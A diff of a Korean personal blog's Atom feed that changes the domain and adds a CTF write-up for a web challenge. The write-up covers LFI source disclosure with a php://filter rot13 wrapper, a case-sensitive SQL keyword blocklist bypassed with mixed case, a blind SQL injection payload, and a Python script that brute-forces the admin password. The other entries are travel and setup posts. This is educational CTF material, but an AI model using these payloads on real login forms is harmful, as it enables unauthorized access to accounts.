@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
- <title>GAON°NR</title>
- <link href="https://gaonnr.github.io/atom.xml" rel="self"/>
- <link href="https://gaonnr.github.io/"/>
- <updated>2016-09-13T11:15:30+09:00</updated>
- <id>https://gaonnr.github.io</id>
+ <title>가온나래</title>
+ <link href="https://blog.gaonnr.me/atom.xml" rel="self"/>
+ <link href="https://blog.gaonnr.me/"/>
+ <updated>2016-09-25T13:12:48+09:00</updated>
+ <id>https://blog.gaonnr.me</id>
  <author>
    <name>Junseop Ji</name>
    <email>gaon0403@gmail.com</email>
@@ -13,10 +13,189 @@
 
  
  <entry>
+   <title>2016 Kaist - Postech Science War Writeup (wargame_easy | Web 200pt)</title>
+   <link href="https://blog.gaonnr.me/hacking/2016/09/24/kapo-writeup/"/>
+   <updated>2016-09-24T00:00:00+09:00</updated>
+   <id>https://blog.gaonnr.me/hacking/2016/09/24/kapo-writeup</id>
+   <content type="html">&lt;p&gt;처음으로 쓰는 Writeup이다!&lt;/p&gt;
+
+&lt;p&gt;Web계열의 200점(확실하지 않음)짜리 문제인 &lt;a href=&quot;http://chall.pwn-with.me&quot;&gt;wargame_easy&lt;/a&gt;이다.&lt;/p&gt;
+
+&lt;p align=&quot;CENTER&quot;&gt;
+  &lt;img src=&quot;/images/2016_09/kapo16/main1.png&quot; style=&quot;width: 640px;&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;링크를 타고 들어가면, 환영 문구와 함께 ‘Login’ ‘Register’ 두 개의 메뉴가 보인다.&lt;br /&gt;
+Register 메뉴를 통해 사이트에 가입한 후 로그인하면 다음과 같은 화면이 나온다.&lt;/p&gt;
+
+&lt;p align=&quot;CENTER&quot;&gt;
+  &lt;img src=&quot;/images/2016_09/kapo16/main2.png&quot; style=&quot;width: 640px;&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Prob, Auth, Rank 등의 메뉴로 미루어 보건데 CTF사이트를 모티브로 만들어진 사이트이다.&lt;br /&gt;
+실제로 Prob에 적혀있는 키를 Auth에 넣어 보니 점수가 올라가 Rank에 반영되는 것을 확인할 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;rank 메뉴에 진입했을 때의 URL이 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://chall.pwn-with.me/?page=rank&lt;/code&gt;이므로, LFI 취약점이 존재할 것으로 생각된다.&lt;br /&gt;
+이를 이용해서 php filer로 base64 인코딩된 소스를 얻으려 했으나, 소스 보기를 했을 경우 detected라는 문구밖에 보이지 않는다. page 뒤의 argument에 특정 단어가 삽임되었을 경우 이를 필터랑하고 detected를 출력하도록 프로그램되었을 것을 예상할 수 있다.&lt;/p&gt;
+
+&lt;p&gt;다른 php filter를 이용한 시도 결과, &lt;code class=&quot;highlighter-rouge&quot;&gt;php://filter/read=string.rot13/resource=&lt;/code&gt;가 filtering에 걸리지 않음을 확인할 수 있었고, 이를 통해 login, register, rank, info 페이지의 소스를 13칸 밀린 caesar cipher의 형태로 알아낼 수 있었다.&lt;br /&gt;
+이를 복호화한 결과는 다음과 같다. (당시 toUpper 함수를 사용하여, 모든 소스가 대문자로 이루어져 있다)&lt;/p&gt;
+
+&lt;p align=&quot;CENTER&quot;&gt;
+  &lt;a href=&quot;https://github.com/GAONNR/Kapo2016/blob/master/plainIndex.php&quot;&gt;index.php&lt;/a&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;
+  &lt;a href=&quot;https://github.com/GAONNR/Kapo2016/blob/master/plainLogin.php&quot;&gt;login.php&lt;/a&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;
+  &lt;a href=&quot;https://github.com/GAONNR/Kapo2016/blob/master/plainInfo.php&quot;&gt;info.php&lt;/a&gt;
+&lt;/p&gt;
+
+&lt;p&gt;먼저 주목해야 할 것은 info페이지의 19 ~ 35번 라인이다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PHP
+&amp;lt;?PHP
+	IF($_POST){
+	   IF($_SESSION[ID] == &#39;ADMIN&#39;) EXIT();
+     IF($_POST[PW] == &quot;&quot;){
+				ECHO &quot;&amp;lt;SCRIPT&amp;gt;ALERT(&#39;INPUT YOUR PASSWORD.&#39;);HISTORY.GO(-1);&amp;lt;/SCRIPT&amp;gt;&quot;;
+			  EXIT();
+     }
+		 IF(STRLEN($_POST[PW]) &amp;gt; 32){
+		    ECHO &quot;&amp;lt;SCRIPT&amp;gt;ALERT(&#39;CAN&#39;T CREATE PASSWORD BIGGER THAN 32 BYTES.&#39;);HISTORY.GO(-1);&amp;lt;/SCRIPT&amp;gt;&quot;;
+				EXIT();
+		 }
+		 $_POST[PW] = ADDSLASHES($_POST[PW]);
+		 $SQL = &quot;UPDATE MEMBER SET PW = &#39;$_POST[PW]&#39; WHERE ID = &#39;$_SESSION[ID]&#39;&quot;;
+		 $Q = @MYSQL_QUERY($SQL);
+		 ECHO &quot;&amp;lt;SCRIPT&amp;gt;ALERT(&#39;PW CHANGED.&#39;);LOCATION.HREF=&#39;?PAGE=INFO&#39;;&amp;lt;/SCRIPT&amp;gt;&quot;;
+	}
+?&amp;gt;
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;info 페이지는 사용자의 비멀번호를 변경할 수 있는 페이지인데, 세 번째 줄의 &lt;code class=&quot;highlighter-rouge&quot;&gt;IF($_SESSION[ID] == &#39;ADMIN&#39;) EXIT();&lt;/code&gt;에 의해 서버에 admin이 등록되어 있으며, admin 계정의 비밀번호 변경을 막고 있음을 알 수 있다. 따라서 admin계정의 비밀번호를 알아내는 것을 목표로 정하고 다음 과정을 진행하였다.&lt;/p&gt;
+
+&lt;p&gt;다음으로 login 페이지의 12 ~ 35번 라인에서 공격 방식에 대한 힌트를 찾을 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PHP
+&amp;lt;?PHP
+	IF($_POST){
+		IF($_SESSION[ID]){
+			ECHO &quot;&amp;lt;SCRIPT&amp;gt;ALERT(&#39;YOU HAVE ALREADY LOGGED IN.&#39;);HISTORY.GO(-1);&amp;lt;/SCRIPT&amp;gt;&quot;;
+			EXIT();
+		}
+		$SQL = &quot;SELECT * FROM MEMBER WHERE ID = &#39;&quot;.TRIM($_POST[ID]).&quot;&#39;&quot;;
+		$RESULT = @MYSQL_QUERY($SQL);
+		$DATA = @MYSQL_FETCH_ARRAY($RESULT);
+		IF($DATA[ID]){
+			IF($_POST[PW] == $DATA[PW]){
+				$_SESSION[ID] = $DATA[ID];
+				ECHO &quot;&amp;lt;SCRIPT&amp;gt;ALERT(&#39;HELLO $_SESSION[ID]&#39;);LOCATION.HREF=&#39;./&#39;;&amp;lt;/SCRIPT&amp;gt;&quot;;
+			}ELSE{
+				ECHO &quot;&amp;lt;SCRIPT&amp;gt;HISTORY.GO(-1);&amp;lt;/SCRIPT&amp;gt;&quot;;
+				EXIT();
+			}
+		}ELSE{
+			ECHO &quot;&amp;lt;SCRIPT&amp;gt;HISTORY.GO(-1);&amp;lt;/SCRIPT&amp;gt;&quot;;
+			EXIT();
+		}
+	}
+?&amp;gt;
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;공격 방식으로 SQL Injection이 유효함을 (매우 쉽게) 알 수 있다.&lt;/p&gt;
+
+&lt;p&gt;이제 index 페이지의 75 ~ 80번 라인을 보면,&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PHP
+&amp;lt;?PHP
+	IF(PREG_MATCH(&quot;/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|&amp;gt;|&amp;lt;|,|\*|!|\.\./&quot;,IMPLODE($_GET))) EXIT(&quot;DETECTED&quot;);
+	IF(PREG_MATCH(&quot;/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|&amp;gt;|&amp;lt;|,|\*|!|\.\./&quot;,IMPLODE($_POST))) EXIT(&quot;DETECTED&quot;);
+	IF(ISSET($_GET[PAGE])){
+		INCLUDE($_GET[PAGE].&quot;.PHP&quot;);
+	}ELSE{
+?&amp;gt;
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;base64, select 등의 많은 구문을 입력에서 걸러내고 있음을 알 수 있다. 처음 LFI를 시도할 때, base64 filter가 detected된 것도 이 코드에 의해서임을 파악할 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;처음에는 Time-based Blind SQL Injecton으로 공격을 시도하려 했으나, &lt;code class=&quot;highlighter-rouge&quot;&gt;sleep&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;bench&lt;/code&gt;등의 중요한 함수들이 필터링되고, 결정적으로 괄호 &lt;code class=&quot;highlighter-rouge&quot;&gt;(&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;)&lt;/code&gt;들이 필터링되어 불가능하다고 판단되었다.  괄호가 막혔기 때문에 목록에 없는 함수를 사용하는 것도 거의 불가능했다.&lt;/p&gt;
+
+&lt;p&gt;그러나 곧 위 코드의 치명적인 취약점을 찾아낼 수 있었는데, 그것은 &lt;code class=&quot;highlighter-rouge&quot;&gt;preg_match&lt;/code&gt;함수의 첫 번째 argument string 뒤에 &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt;가 붙지 않았다는 것이었다. 이는 preg_match에서 대소문자를 구별하여 받아들인다는 것을 뜻하고, SQL은 구문의 대소문자를 구별하지 않으므로, 이를 이용하여 필터링을 아주 간단하게 우회할 수 있었다. 예를 들어 &lt;code class=&quot;highlighter-rouge&quot;&gt;like&lt;/code&gt;를 SQL 구문에 포함시키고 싶다면, &lt;code class=&quot;highlighter-rouge&quot;&gt;like&lt;/code&gt; 대신 &lt;code class=&quot;highlighter-rouge&quot;&gt;LikE&lt;/code&gt;라고 쓰면 필터링을 우회하여 서버에 그대로 구문을 보낼 수 있게 된다.&lt;/p&gt;
+
+&lt;p&gt;이에 착안하여 다음과 같은 payload를 만들 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fqwrlqwrhqwklhflqfi123123&#39; or CASE WHEN id=&#39;admin&#39; AND pw LikE &#39;a%&#39; THEN TRUE ELSE FALSE END or id=&#39;godj3&#39; order by id asc -- a&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;이를 login의 id에 넣으면 다음과 같은 SQL Query가 완성된다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SQL
+SELECT * FROM MEMBER WHERE ID = &#39;fqwrlqwrhqwklhflqfi123123&#39; or CASE WHEN id=&#39;admin&#39; AND pw LikE &#39;a%&#39; THEN TRUE ELSE FALSE END or id=&#39;godj3&#39; order by id asc -- a
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;괄호가 필터링됨으로 인해 if, substr등의 함수를 사용할 수 없었으므로, 그 대신에 case when과 like를 활용하여 비슷한 역할을 하는 구문을 만들 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;ID로 들어가는 &lt;code class=&quot;highlighter-rouge&quot;&gt;fqwrlqwrhqwklhflqfi123123&lt;/code&gt;은 서버에 등록되어 있지 않은 id이므로, 언제나 거짓을 반환한다. 그 후 &lt;code class=&quot;highlighter-rouge&quot;&gt;CASE WHEN id=&#39;admin&#39; AND pw LikE &#39;a%&#39; THEN TRUE ELSE FALSE END&lt;/code&gt;를 만나게 되는데, 만약 admin의 pw가 a로 시작한다면 TRUE를, 아니라면 FALSE를 반환한다. 만약 FALSE라면, 뒤의 구문에 의해 &lt;code class=&quot;highlighter-rouge&quot;&gt;godj3&lt;/code&gt;을 id로서 불러오게 되고, pw부분에 미리 만들어 둔 godj3 계정의 비밀번호를 입력해 두면 godj3계정으로 로그인된다. 만약 admin의 pw가 a로 시작한다면, 미리 입력해 둔 godj3 계정의 비밀번호와 admin의 비밀번호는 맞지 않을 것이므로 로그인에 실패하게 된다. 이를 이용하여 admin의 password를 알아내는 프로그램을 짤 수 있다.&lt;/p&gt;
+
+&lt;p align=&quot;CENTER&quot;&gt;
+	&lt;a href=&quot;https://github.com/GAONNR/Kapo2016/blob/master/login.py&quot;&gt;login.py&lt;/a&gt;
+&lt;/p&gt;
+
+&lt;p&gt;```python
+import requests
+import string&lt;/p&gt;
+
+&lt;p&gt;baseurl = ‘http://chall.pwn-with.me/?page=login’&lt;/p&gt;
+
+&lt;p&gt;def postData(id, pw):
+    params = {‘id’: id, ‘pw’: pw}
+    res = requests.post(baseurl, data = params)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#print res.text
+if res.text.find(&#39;Hello&#39;) &amp;gt; 0:
+    return True
+else:
+    return False
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h1 id=&quot;print-postdatafqwrlqwrhqwklhflqf-or-ifidadmin-and-0-1-0-or-nameguest-order-by-name-asc----a-guest&quot;&gt;print postData(‘&#39;’fqwrlqwrhqwklhflqf’ or if(id=’admin’ and 0, 1, 0) or name=’guest’ order by name asc – a’’’, ‘guest’)&lt;/h1&gt;
+
+&lt;p&gt;print postData(“fqwrlqwrhqwklhflqfi123123’ or CASE WHEN id=’admin’ AND FALSE THEN TRUE ELSE FALSE END or id=’godj3’ order by id asc – a”, ‘godj3’)&lt;/p&gt;
+
+&lt;p&gt;print postData(‘godj3’, ‘godj3’)&lt;/p&gt;
+
+&lt;p&gt;print postData(“sadawqoeqweqnnncxma’ or id=’godj3’ – a”, ‘godj3’)&lt;/p&gt;
+
+&lt;p&gt;payload = “fqwrlqwrhqwklhflqfi123123’ or CASE WHEN id=’admin’ AND pw LikE ‘”&lt;/p&gt;
+
+&lt;p&gt;payend = “%’ THEN TRUE ELSE FALSE END or id=’godj3’ order by id asc – a”&lt;/p&gt;
+
+&lt;p&gt;key = ‘’&lt;/p&gt;
+
+&lt;p&gt;for k in range(100):
+    check = False
+    for i in string.printable:
+        if i == ‘_’ or i == ‘!’ or i == ‘#’ or i == ‘%’ or i == ‘&#39;’ or i == ‘&quot;’ or i == ‘(‘ or i == ‘)’ or i == ‘*’ or i == ‘+’ or i == ‘-‘ or i == ‘&amp;amp;’ or i == ‘|’ or i == ‘&amp;gt;’ or i == ‘&amp;lt;’ or i == ‘=’ or i == ‘?’ or i == ‘~’ or i == ‘,’:
+            continue
+        # print key + i,
+        # print postData(payload + i + payend, ‘godj3’)
+        if not postData(payload + key + i + payend, ‘godj3’):
+            print key + i
+            key = key + i
+            check = True
+            break&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if check == False:
+    key += &#39;_&#39; ```
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;kapo{j.s.bach_french_suites}&lt;/code&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
    <title>자기소개서 글자 수 (Byte수) 카운팅 프로그램</title>
-   <link href="https://gaonnr.github.io/development/2016/09/13/jagisogae/"/>
+   <link href="https://blog.gaonnr.me/development/2016/09/13/jagisogae/"/>
    <updated>2016-09-13T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/development/2016/09/13/jagisogae</id>
+   <id>https://blog.gaonnr.me/development/2016/09/13/jagisogae</id>
    <content type="html">&lt;p&gt;고등학교 2학년 때, 대입 원서를 쓸 당시 너무나도 딴짓이 하고 싶었던 나머지 자기 소개서의 글자 수를 세 주는 프로그램을 만들었는데, 어쩌다 보니 다음 해, 다다음 해에도 이 프로그램을 찾아주는 후배님들이 계셔서, 몇 달 전에 웹 페이지를 따로 제작하여 프로그램에 대한 정리와 함께 올려 두었다.&lt;/p&gt;
 
 &lt;p&gt;당시 하나도 모르던 C#(지금도 하나도 모른다)을 여기저기 구글링하면서 짠 프로그램이라, 꽤 엉성하다.&lt;/p&gt;
@@ -31,9 +210,9 @@
  
  <entry>
    <title>八王子P 베스트 앨범 [Eight - The Best of 八王子P] 구매</title>
-   <link href="https://gaonnr.github.io/otaku/2016/06/30/Eight-Album/"/>
+   <link href="https://blog.gaonnr.me/otaku/2016/06/30/Eight-Album/"/>
    <updated>2016-06-30T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/otaku/2016/06/30/Eight-Album</id>
+   <id>https://blog.gaonnr.me/otaku/2016/06/30/Eight-Album</id>
    <content type="html">&lt;p&gt;몇 주 전에 하치오지P(八王子P)의 베스트 앨범이 발매된다는 소식을 들었다. 원래 그렇게 좋아하는 보컬로이드 프로듀서는 아니었지만, 저번 삿포로 여행에서 DJ Live에 참가하고 나서 호감을 가지게 되어 심심할 때마다 음악을 듣고 있었는데, 베스트 앨범이 발매된다고 하길래 조금의 고민 끝에 구매를 결정했다.&lt;/p&gt;
 
 &lt;p&gt;초회한정판과 일반판 두 가지로 나뉘어 발매되었는데, 앨범 일러스트가 다르고, 초회한정판에는 주요 곡들의 PV가 담긴 DVD가 동봉되어 있다. 본인은 초회한정판을 구매했다.&lt;/p&gt;
@@ -172,9 +351,9 @@
  
  <entry>
    <title>블로그에 Category 기능을 적용</title>
-   <link href="https://gaonnr.github.io/setting/2016/05/07/Added-Category-Function-To-Blog/"/>
+   <link href="https://blog.gaonnr.me/setting/2016/05/07/Added-Category-Function-To-Blog/"/>
    <updated>2016-05-07T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/setting/2016/05/07/Added-Category-Function-To-Blog</id>
+   <id>https://blog.gaonnr.me/setting/2016/05/07/Added-Category-Function-To-Blog</id>
    <content type="html">&lt;p&gt;블로그의 글 개수가 점점 많아짐에 따라, Jekyll의 category 기능을 이용하여 포스트들을 정리해 보기로 했다.&lt;/p&gt;
 
 &lt;p&gt;기본적으로 &lt;a href=&quot;http://stackoverflow.com/questions/20872861/jekyll-display-posts-by-category&quot;&gt;이곳&lt;/a&gt;의 YAML 코드를 참고하여 작성하였다.&lt;/p&gt;
@@ -192,9 +371,9 @@
  
  <entry>
    <title>OS X에서 NTFS 사용하기 - OSXfuse, ntfs-3g</title>
-   <link href="https://gaonnr.github.io/setting/2016/05/06/Using-NTFS-On-OSX/"/>
+   <link href="https://blog.gaonnr.me/setting/2016/05/06/Using-NTFS-On-OSX/"/>
    <updated>2016-05-06T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/setting/2016/05/06/Using-NTFS-On-OSX</id>
+   <id>https://blog.gaonnr.me/setting/2016/05/06/Using-NTFS-On-OSX</id>
    <content type="html">&lt;p&gt;OS X는 공식적으로 NTFS를 지원하지 않는다. 그러나 시중에 나와있는 외장
 하드디스크들은 대부분 NTFS 포맷이므로, 대용량 자료들을 복사하기 위해서는 NTFS
 지원이 필요한 것이 사실이다. 본인은 최근까지
@@ -262,9 +441,9 @@ mount되어 쓰기가 가능해진 것을 확인할 수 있다.&lt;/p&gt;
  
  <entry>
    <title>XCode의 playground를 이용하여 Swift 학습하기, 터미널(terminal)을 통해 Swift 코드 실행시키기</title>
-   <link href="https://gaonnr.github.io/development/2016/04/18/Using-Swift-With-XCode-Playground/"/>
+   <link href="https://blog.gaonnr.me/development/2016/04/18/Using-Swift-With-XCode-Playground/"/>
    <updated>2016-04-18T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/development/2016/04/18/Using-Swift-With-XCode-Playground</id>
+   <id>https://blog.gaonnr.me/development/2016/04/18/Using-Swift-With-XCode-Playground</id>
    <content type="html">&lt;p&gt;&lt;span class=&quot;italics&quot;&gt; 이 글은 OS X, El Capitan, Swift 2.2 환경에서 작성되었습니다.&lt;/span&gt;&lt;/p&gt;
 
 &lt;p&gt;최근 동아리가 출전한 pCTF 2016에서 Swift언어로 된 문제가 출제되었다.&lt;br /&gt;
@@ -382,9 +561,9 @@ print(&quot;Your name is \(name!)&quot;)
  
  <entry>
    <title>gaonnr.me 도메인 구매</title>
-   <link href="https://gaonnr.github.io/setting/2016/04/15/bought-domain/"/>
+   <link href="https://blog.gaonnr.me/setting/2016/04/15/bought-domain/"/>
    <updated>2016-04-15T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/setting/2016/04/15/bought-domain</id>
+   <id>https://blog.gaonnr.me/setting/2016/04/15/bought-domain</id>
    <content type="html">&lt;p&gt;원격 접속 및 블로그 리다이렉트용으로 사용하기 위해서 도메인을 구입하였다.&lt;br /&gt;
 사실 miku.moe(…)를 구매하려고 했지만, 누군가가 이미 사서 개발중이라길래 눈물을 머금고 관뒀다.&lt;br /&gt;
 moe 도메인 다음으로 탐났던 도메인이 .me 도메인인 관계로 &lt;a href=&quot;https://kr.godaddy.com/&quot;&gt;GoDaddy&lt;/a&gt;에서 gaonnr.me 도메인을 구매하였다.&lt;/p&gt;
@@ -405,9 +584,9 @@ moe 도메인 다음으로 탐났던 도메인이 .me 도메인인 관계로 &lt
  
  <entry>
    <title>vimrc 설정하기 - 기본 설정 및 Plugin</title>
-   <link href="https://gaonnr.github.io/development/2016/03/15/setting-vimrc/"/>
+   <link href="https://blog.gaonnr.me/development/2016/03/15/setting-vimrc/"/>
    <updated>2016-03-15T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/development/2016/03/15/setting-vimrc</id>
+   <id>https://blog.gaonnr.me/development/2016/03/15/setting-vimrc</id>
    <content type="html">&lt;p&gt;동아리에서 새로 판 서버에다 지금까지 로컬에서 썼던 &lt;code class=&quot;highlighter-rouge&quot;&gt;.vimrc&lt;/code&gt;파일을 옮기려다가 mv대신 rm을 써서 날려먹었다.&lt;/p&gt;
 
 &lt;p&gt;어디 백업해 놓은 것도 없었기 때문에 어쩔 수 없이 새로 작성하는 겸, 내가 사용하는 설정을 정리해서 올리기로 했다.&lt;/p&gt;
@@ -526,9 +705,9 @@ autocmd VimEnter * call StartUp()
  
  <entry>
    <title>삿포로 여행 3일차 - 유키미쿠와 삿포로 팩토리, 삿포로 구도청사와 시계탑, 라면 거리, 스스키노 아이스 월드, 그리고 TV타워</title>
-   <link href="https://gaonnr.github.io/trip/2016/02/06/Sapporo-Trip-3/"/>
+   <link href="https://blog.gaonnr.me/trip/2016/02/06/Sapporo-Trip-3/"/>
    <updated>2016-02-06T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/trip/2016/02/06/Sapporo-Trip-3</id>
+   <id>https://blog.gaonnr.me/trip/2016/02/06/Sapporo-Trip-3</id>
    <content type="html">&lt;p&gt;오늘은 어제보다 한시간 정도 일찍 기상해서 일정을 시작…하기로 했었는데, 가스 공급의 문제로 숙소에 잠깐 온수가 나오지 않은 덕분에 출발 일정이 1시간 늦어졌다. 그래도 이미 있는 계획을 엎을 수는 없으니, 부랴부랴 일정에 맞춰 움직이기로 했다.&lt;/p&gt;
 
 &lt;p&gt;어찌저찌 유키미쿠 관련 굿즈들을 파는 삿포로 팩토리 홀에 도착.&lt;/p&gt;
@@ -728,9 +907,9 @@ autocmd VimEnter * call StartUp()
  
  <entry>
    <title>삿포로 여행 2일차 - 스스키노 역, 스프카레, 애니메이트와 멜론북스 등등, 그리고 징기스칸</title>
-   <link href="https://gaonnr.github.io/trip/2016/02/05/Sapporo-Trip-2/"/>
+   <link href="https://blog.gaonnr.me/trip/2016/02/05/Sapporo-Trip-2/"/>
    <updated>2016-02-05T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/trip/2016/02/05/Sapporo-Trip-2</id>
+   <id>https://blog.gaonnr.me/trip/2016/02/05/Sapporo-Trip-2</id>
    <content type="html">&lt;p&gt;삿포로 여행 2일차. 오늘은 스스키노 역 주변을 다녀왔다.&lt;/p&gt;
 
 &lt;p&gt;원래는 지하철을 타고 가려고 했는데, 리듬게임에 인생을 바친 한 친구가 이미 역 근처의 오락실(= 타이토 게임센터) 위치를 알아놓은 덕분에 걸어갈 수 있었다.&lt;/p&gt;
@@ -838,9 +1017,9 @@ autocmd VimEnter * call StartUp()
  
  <entry>
    <title>삿포로 여행 1일차 - 신 치토세 공항, 유키미쿠 스카이타운</title>
-   <link href="https://gaonnr.github.io/trip/2016/02/04/Sapporo-Trip-1/"/>
+   <link href="https://blog.gaonnr.me/trip/2016/02/04/Sapporo-Trip-1/"/>
    <updated>2016-02-04T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/trip/2016/02/04/Sapporo-Trip-1</id>
+   <id>https://blog.gaonnr.me/trip/2016/02/04/Sapporo-Trip-1</id>
    <content type="html">&lt;p&gt;친구 녀석들과 함께 삿포로 여행을 왔다. 2월 4일부터 11일까지, 9일간의 여행이다.&lt;/p&gt;
 
 &lt;p&gt;작년에는 도쿄로 4박 5일 여행을 다녀왔는데, 사실상 여행 기간이 두배가 된 셈이다. 일정은 (다른 친구가) 어느 정도 세워 놓았지만, 날짜가 긴 만큼 얼마나 알차게 여행을 보낼 수 있을지는 잘 모르겠다. 그래도 명색이 세계 3대 축제라는 삿포로 눈 축제에 맞춰서 왔는데, 볼 거리가 많기를 바랄 뿐이다.&lt;/p&gt;
@@ -932,9 +1111,9 @@ autocmd VimEnter * call StartUp()
  
  <entry>
    <title>본문용으로 웹폰트 (Kopub바탕) 적용했습니다.</title>
-   <link href="https://gaonnr.github.io/setting/2016/02/01/NewWebfont-Kopub/"/>
+   <link href="https://blog.gaonnr.me/setting/2016/02/01/NewWebfont-Kopub/"/>
    <updated>2016-02-01T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/setting/2016/02/01/NewWebfont-Kopub</id>
+   <id>https://blog.gaonnr.me/setting/2016/02/01/NewWebfont-Kopub</id>
    <content type="html">&lt;p&gt;예전에 웹폰트를 추가했더니 사이트 접속이 느려지는 바람에 웹폰트를 날렸었는데, 갑자기 또 마음이 변해서 이정도면 괜찮지 않을까 해서 넣어봤어요.&lt;/p&gt;
 
 &lt;p&gt;새로 넣은 웹폰트는 본문에만 적용되구요, Kopub바탕입니다.&lt;/p&gt;
@@ -945,9 +1124,9 @@ autocmd VimEnter * call StartUp()
  
  <entry>
    <title>블로그 디자인 또 갈아엎었습니다.</title>
-   <link href="https://gaonnr.github.io/setting/2016/01/17/new-design/"/>
+   <link href="https://blog.gaonnr.me/setting/2016/01/17/new-design/"/>
    <updated>2016-01-17T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/setting/2016/01/17/new-design</id>
+   <id>https://blog.gaonnr.me/setting/2016/01/17/new-design</id>
    <content type="html">&lt;p&gt;그전엔 Jekyll-Bootstrap을 썼습니다만, 왠지 어떻게 해야 할지를 잘 몰라서 뭔가 정보가 쬐끔 더 있어보이는 Jekyll-Now를 clone했어요. (이건 사실 제가 몰라서 그러는 거고, 좀만 배우면 이런거 상관없이 쓸듯한데)&lt;/p&gt;
 
 &lt;p&gt;테마는 Lanyon Theme 적용했습니다. 본문 서체가 Serif체라 따로 설정 안한 윈도우 환경에서 어떻게 보일지 궁금하긴 한데. 괜찮겠죠 뭐.&lt;/p&gt;
@@ -956,9 +1135,9 @@ autocmd VimEnter * call StartUp()
  
  <entry>
    <title>웹폰트 날렸습니다.</title>
-   <link href="https://gaonnr.github.io/setting/2016/01/03/deleted-webfonts/"/>
+   <link href="https://blog.gaonnr.me/setting/2016/01/03/deleted-webfonts/"/>
    <updated>2016-01-03T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/setting/2016/01/03/deleted-webfonts</id>
+   <id>https://blog.gaonnr.me/setting/2016/01/03/deleted-webfonts</id>
    <content type="html">&lt;p&gt;원래는 Spoqa Han Sans KR/JP가 적용되어 있었는데요…
 긱사에서 테스트해볼 때는 별로 문제점을 못 느꼈는데&lt;/p&gt;
 
@@ -975,9 +1154,9 @@ autocmd VimEnter * call StartUp()
  
  <entry>
    <title>About me</title>
-   <link href="https://gaonnr.github.io/setting/2016/01/03/about-me/"/>
+   <link href="https://blog.gaonnr.me/setting/2016/01/03/about-me/"/>
    <updated>2016-01-03T00:00:00+09:00</updated>
-   <id>https://gaonnr.github.io/setting/2016/01/03/about-me</id>
+   <id>https://blog.gaonnr.me/setting/2016/01/03/about-me</id>
    <content type="html">&lt;!--
 &lt;p align = &quot;center&quot;&gt;
   &lt;img src = &quot;/images/About_me.png&quot; width = &quot;250&quot; height = &quot;250&quot;&gt;
